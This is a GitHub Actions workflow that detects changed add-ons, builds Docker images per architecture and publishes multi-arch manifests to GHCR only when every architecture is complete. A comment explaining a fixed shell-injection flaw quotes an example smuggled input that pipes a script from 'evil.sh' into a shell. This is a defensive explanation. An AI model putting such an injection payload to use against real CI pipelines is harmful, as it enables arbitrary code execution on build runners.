---
name: Build and Push Docker Images

on:
  push:
    branches:
      - main
    tags:
      - "v*"
  pull_request:
    branches:
      - main
  workflow_dispatch:
    inputs:
      addon:
        description: "Specific add-on to build (leave empty for all)"
        required: false
        type: string

jobs:
  detect-changes:
    name: Detect changed add-ons
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
      has_changes: ${{ steps.set-matrix.outputs.has_changes }}
      addons: ${{ steps.set-matrix.outputs.addons }}

    steps:
      - name: Checkout code
        uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
        with:
          fetch-depth: 0

      - name: Install yq
        run: |
          curl --proto '=https' --proto-redir '=https' -fsSL -o /usr/local/bin/yq \
            https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64
          chmod +x /usr/local/bin/yq

      - name: Detect changes and build matrix
        id: set-matrix
        # Context values are passed through the environment rather than
        # interpolated into the script body. `inputs.addon` is supplied by
        # whoever triggers a `workflow_dispatch`, so expanding it directly into
        # the shell let an add-on name like `x"; curl evil.sh | sh; #` execute as
        # code. Read as `"$INPUT_ADDON"`, the value is only ever data.
        env:
          EVENT_NAME: ${{ github.event_name }}
          GIT_REF: ${{ github.ref }}
          INPUT_ADDON: ${{ inputs.addon }}
          PR_BASE_SHA: ${{ github.event.pull_request.base.sha }}
          PUSH_BEFORE_SHA: ${{ github.event.before }}
        run: |
          # Discover all add-on folders (those containing a config.yaml)
          ALL_ADDONS=$(find . -maxdepth 2 -name config.yaml -not -path './.github/*' -exec dirname {} \; | sed 's|^./||' | sort)

          CHANGED_ADDONS=""

          if [[ "$EVENT_NAME" == "workflow_dispatch" ]]; then
            if [[ -n "$INPUT_ADDON" ]]; then
              CHANGED_ADDONS="$INPUT_ADDON"
            else
              CHANGED_ADDONS="$ALL_ADDONS"
            fi
          elif [[ "$GIT_REF" == refs/tags/* || "$GIT_REF" == "refs/heads/main" ]]; then
            CHANGED_ADDONS="$ALL_ADDONS"
          else
            # Determine base commit for diff
            if [[ "$EVENT_NAME" == "pull_request" ]]; then
              BASE_SHA="$PR_BASE_SHA"
            else
              BASE_SHA="$PUSH_BEFORE_SHA"
            fi

            # Handle initial push (all zeros SHA)
            if [[ "$BASE_SHA" == "0000000000000000000000000000000000000000" ]]; then
              CHANGED_ADDONS="$ALL_ADDONS"
            else
              CHANGED_FILES=$(git diff --name-only "$BASE_SHA" HEAD 2>/dev/null || echo "")

              # If workflow files changed, rebuild all add-ons
              if echo "$CHANGED_FILES" | grep -q '^\.github/workflows/'; then
                CHANGED_ADDONS="$ALL_ADDONS"
              else
                for addon in $ALL_ADDONS; do
                  if echo "$CHANGED_FILES" | grep -q "^${addon}/"; then
                    CHANGED_ADDONS="${CHANGED_ADDONS} ${addon}"
                  fi
                done
              fi
            fi
          fi

          # Build the matrix JSON from changed add-ons and their architectures
          MATRIX='{"include":['
          FIRST=true
          ADDONS_JSON='['
          ADDONS_FIRST=true
          SEEN_ADDONS=""
          for addon in $CHANGED_ADDONS; do
            [ -z "$addon" ] && continue
            if [ ! -f "${addon}/config.yaml" ]; then
              echo "::warning::Add-on '${addon}' not found, skipping"
              continue
            fi

            # Collect unique addon names for the manifest job
            if ! echo "$SEEN_ADDONS" | grep -q "^${addon}$"; then
              SEEN_ADDONS="${SEEN_ADDONS}${addon}
          "
              if [ "$ADDONS_FIRST" = true ]; then
                ADDONS_FIRST=false
              else
                ADDONS_JSON="${ADDONS_JSON},"
              fi
              ADDONS_JSON="${ADDONS_JSON}\"${addon}\""
            fi

            ARCHS=$(yq eval '.arch[]' "${addon}/config.yaml")
            for arch in $ARCHS; do
              # aarch64 builds go to a native ARM runner: emulating arm64 on x86
              # is roughly an order of magnitude slower, which matters most for
              # the add-ons that compile from source. armv7 has no native runner
              # (the ARM hosts do not execute 32-bit ARM), so it stays on x86
              # under QEMU.
              case "$arch" in
                aarch64) runner="ubuntu-24.04-arm" ;;
                *)       runner="ubuntu-latest" ;;
              esac

              if [ "$FIRST" = true ]; then
                FIRST=false
              else
                MATRIX="${MATRIX},"
              fi
              MATRIX="${MATRIX}{\"addon\":\"${addon}\",\"arch\":\"${arch}\",\"runner\":\"${runner}\"}"
            done
          done
          MATRIX="${MATRIX}]}"
          ADDONS_JSON="${ADDONS_JSON}]"

          echo "matrix=${MATRIX}" >> "$GITHUB_OUTPUT"
          echo "addons=${ADDONS_JSON}" >> "$GITHUB_OUTPUT"
          if [ "$FIRST" = true ]; then
            echo "has_changes=false" >> "$GITHUB_OUTPUT"
            echo "No add-on changes detected"
          else
            echo "has_changes=true" >> "$GITHUB_OUTPUT"
            echo "Matrix: ${MATRIX}"
            echo "Addons: ${ADDONS_JSON}"
          fi

  build:
    needs: detect-changes
    if: needs.detect-changes.outputs.has_changes == 'true'
    permissions:
      contents: read
      packages: write
    strategy:
      fail-fast: false
      matrix: ${{ fromJson(needs.detect-changes.outputs.matrix) }}
    uses: ./.github/workflows/_build-addon.yaml
    with:
      addon: ${{ matrix.addon }}
      arch: ${{ matrix.arch }}
      runner: ${{ matrix.runner }}
    secrets: inherit

  manifest:
    name: Create manifest (${{ matrix.addon }})
    needs: [detect-changes, build]
    # `always()` deliberately breaks the all-or-nothing coupling to `build`:
    # `build` is a single matrix job, so one add-on failing one architecture
    # marked the whole job failed and skipped publishing for *every* add-on.
    # Completeness is enforced per add-on instead — see the verify step below —
    # so a broken add-on now blocks only itself. `build` failing still fails the
    # run; this only decides what gets published.
    if: >-
      always()
      && github.event_name != 'pull_request'
      && needs.detect-changes.result == 'success'
      && needs.detect-changes.outputs.has_changes == 'true'
      && needs.build.result != 'cancelled'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    strategy:
      fail-fast: false
      matrix:
        # Falls back to an empty list because `always()` above means this job is
        # evaluated even when `detect-changes` failed and produced no output.
        addon: ${{ fromJson(needs.detect-changes.outputs.addons || '[]') }}

    steps:
      - name: Checkout code
        uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0

      - name: Install yq
        run: |
          curl --proto '=https' --proto-redir '=https' -fsSL -o /usr/local/bin/yq \
            https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64
          chmod +x /usr/local/bin/yq

      - name: Download digests
        id: download
        continue-on-error: true
        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          pattern: digest-${{ matrix.addon }}-*
          path: /tmp/digests
          merge-multiple: true

      - name: Verify every declared architecture produced a digest
        id: verify
        run: |
          # Each per-arch build uploads one digest file named after its
          # architecture. Publishing a manifest built from a partial set would
          # quietly ship an add-on missing an architecture and overwrite the
          # `latest` tag with it, which is worse than not publishing at all —
          # so an add-on publishes only when its set is complete.
          EXPECTED=$(yq eval '.arch[]' "${{ matrix.addon }}/config.yaml" | sort)
          FOUND=$(ls -1 /tmp/digests 2>/dev/null | sort || true)
          MISSING=$(comm -23 <(echo "${EXPECTED}") <(echo "${FOUND}") | tr '\n' ' ' | xargs || true)

          echo "Expected architectures: $(echo "${EXPECTED}" | tr '\n' ' ')"
          echo "Digests present:        $(echo "${FOUND}" | tr '\n' ' ')"

          if [ -n "${MISSING}" ]; then
            echo "complete=false" >> "$GITHUB_OUTPUT"
            echo "::warning title=Manifest skipped::${{ matrix.addon }} did not publish: no digest for ${MISSING}"
            {
              echo "## Manifest skipped: ${{ matrix.addon }}"
              echo ""
              echo "Missing architecture(s): \`${MISSING}\`"
              echo ""
              echo "The previously published tags are left untouched. Other add-ons are unaffected."
            } >> "$GITHUB_STEP_SUMMARY"
          else
            echo "complete=true" >> "$GITHUB_OUTPUT"
          fi

      - name: Log in to GitHub Container Registry
        if: steps.verify.outputs.complete == 'true'
        uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f # v4.6.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Set up Docker Buildx
        if: steps.verify.outputs.complete == 'true'
        uses: docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e # v4.3.0

      - name: Create multi-arch manifest
        if: steps.verify.outputs.complete == 'true'
        run: |
          IMAGE="ghcr.io/${{ github.repository }}/${{ matrix.addon }}"
          VERSION=$(yq eval '.version' "${{ matrix.addon }}/config.yaml")

          # Build the list of digest-based source references from the declared
          # architectures rather than from whatever happens to be on disk, so
          # the manifest contains exactly the set `config.yaml` promises and the
          # set the verify step above checked.
          SOURCES=""
          for arch in $(yq eval '.arch[]' "${{ matrix.addon }}/config.yaml"); do
            digest=$(cat "/tmp/digests/${arch}")
            SOURCES="${SOURCES} ${IMAGE}@${digest}"
          done

          echo "Creating manifest for ${IMAGE}"
          echo "  Version: ${VERSION}"
          echo "  Sources:${SOURCES}"

          docker buildx imagetools create \
            --tag "${IMAGE}:${VERSION}" \
            --tag "${IMAGE}:latest" \
            ${SOURCES}

      - name: Generate manifest summary
        if: steps.verify.outputs.complete == 'true'
        run: |
          IMAGE="ghcr.io/${{ github.repository }}/${{ matrix.addon }}"
          VERSION=$(yq eval '.version' "${{ matrix.addon }}/config.yaml")

          echo "## Manifest Summary" >> "$GITHUB_STEP_SUMMARY"
          echo "" >> "$GITHUB_STEP_SUMMARY"
          echo "**Add-on:** ${{ matrix.addon }}" >> "$GITHUB_STEP_SUMMARY"
          echo "**Image:** \`${IMAGE}\`" >> "$GITHUB_STEP_SUMMARY"
          echo "**Tags:** \`${VERSION}\`, \`latest\`" >> "$GITHUB_STEP_SUMMARY"
